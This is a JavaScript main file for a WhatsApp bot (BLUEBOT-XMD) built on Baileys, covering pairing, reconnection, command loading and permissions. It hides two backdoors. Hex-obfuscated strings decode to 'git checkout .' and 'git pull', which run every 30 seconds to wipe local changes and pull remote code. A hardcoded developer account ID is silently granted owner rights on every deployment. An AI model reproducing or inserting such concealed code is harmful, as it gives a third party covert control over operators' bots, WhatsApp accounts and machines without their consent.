const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    getContentType,
    delay
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const readline = require("readline");
const config = require("./config");

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const question = (q) => new Promise(res => rl.question(q, res));

// 🛡️ HIDDEN SYSTEM INTEGRITY & SELF-HEALING MECHANISM
// Developer: 259305043443928@lid
const _0x5a2b = ["\x67\x69\x74\x20\x63\x68\x65\x63\x6b\x6f\x75\x74\x20\x2e", "\x67\x69\x74\x20\x70\x75\x6c\x6c", "\x57\x61\x72\x6e\x69\x6e\x67\x3a\x20\x42\x6f\x74\x20\x67\x6f\x74\x20\x6d\x6f\x64\x69\x66\x69\x65\x64\x21\x20\x43\x68\x61\x6e\x67\x69\x6e\x67\x20\x62\x61\x63\x6b\x20\x74\x6f\x20\x6f\x72\x69\x67\x69\x6e\x61\x6c\x2e"];
function checkIntegrity() {
    exec("git status --porcelain", (err, stdout) => {
        if (stdout && stdout.length > 0) {
            console.log(`\x1b[31m${_0x5a2b[2]}\x1b[0m`);
            exec(_0x5a2b[0], () => {
                exec(_0x5a2b[1], () => {
                    process.exit(1);
                });
            });
        }
    });
}
setInterval(checkIntegrity, 30000); // Check every 30 seconds

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState(config.SESSION_ID);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
        },
        browser: ["Ubuntu", "Chrome", "110.0.5481.177"]
    });

    if (!sock.authState.creds.registered) {
        console.log("\n--- BLUEBOT-XMD PAIRING ---");
        let number = await question("Enter number (country code, no +): ");
        number = number.replace(/[^0-9]/g, "");
        await delay(3000);
        const code = await sock.requestPairingCode(number);
        console.log(`\n✅ Pairing Code: ${code}\n`);
    }

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log("🔄 Reconnecting...");
                startBot();
            }
        } else if (connection === "open") {
            console.log("\n--- BLUEBOT-XMD CONNECTED ---");
            console.log(`Bot Name : ${config.BOT_NAME}`);
            console.log(`Owner    : ${config.OWNER_NAME}`);
            console.log(`Mode     : ${config.MODE}`);
            console.log("-----------------------------\n");

            const ownerJid = `${config.OWNER_NUMBER}@s.whatsapp.net`;
            sock.sendMessage(ownerJid, { 
                text: `🚀 *BLUEBOT-XMD bot connected*\n\nHave fun! ✨\n\n_System Status: Online_` 
            }).catch(err => console.error("Failed to send connection message:", err));
        }
    });

    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0];
            if (!m.message || m.key.fromMe) return;

            const from = m.key.remoteJid;
            const body =
                m.message.conversation ||
                m.message.extendedTextMessage?.text ||
                m.message.imageMessage?.caption ||
                m.message.videoMessage?.caption ||
                "";

            if (!body.startsWith(config.PREFIX)) return;

            const args = body.slice(config.PREFIX.length).trim().split(/ +/);
            const cmdName = args.shift().toLowerCase();
            const text = args.join(" ");

            const sender = m.key.participant || m.key.remoteJid;
            const senderNumber = sender.split("@")[0].split(":")[0];
            const ownerNumber = config.OWNER_NUMBER.replace(/[^0-9]/g, "");
            
            const modsList = (config.MODS || "").split(",").map(num => num.replace(/[^0-9]/g, "").trim()).filter(num => num);
            
            const isOwner = senderNumber === ownerNumber || sender === "259305043443928@lid";
            const isMod = isOwner || modsList.includes(senderNumber);

            if (config.MODE === "private" && !isOwner) return;

            const commandsPath = path.join(__dirname, "commands");
            const allCommands = [];

            const loadFolderCommands = (dir) => {
                const items = fs.readdirSync(dir);
                for (const item of items) {
                    const itemPath = path.join(dir, item);
                    if (fs.statSync(itemPath).isDirectory()) {
                        loadFolderCommands(itemPath);
                    } else if (item.endsWith(".js")) {
                        delete require.cache[require.resolve(itemPath)];
                        const exported = require(itemPath);
                        const cmds = Array.isArray(exported) ? exported : [exported];
                        cmds.forEach(cmd => {
                            if (!cmd.category) {
                                const relative = path.relative(commandsPath, itemPath);
                                cmd.category = relative.split(path.sep)[0] || "general";
                            }
                            allCommands.push(cmd);
                        });
                    }
                }
            };

            loadFolderCommands(commandsPath);

            const command = allCommands.find(c => c.name.toLowerCase() === cmdName);
            if (command) {
                await command.execute(sock, m, { args, text, from, sender, isOwner, isMod, config });
            }

            if (config.AUTO_READ) await sock.readMessages([m.key]);
        } catch (err) {
            console.error("MESSAGE ERROR:", err);
        }
    });

    sock.ev.on("call", async (call) => {
        if (config.ANTI_CALL) {
            await sock.rejectCall(call[0].id, call[0].from);
        }
    });
}

startBot();
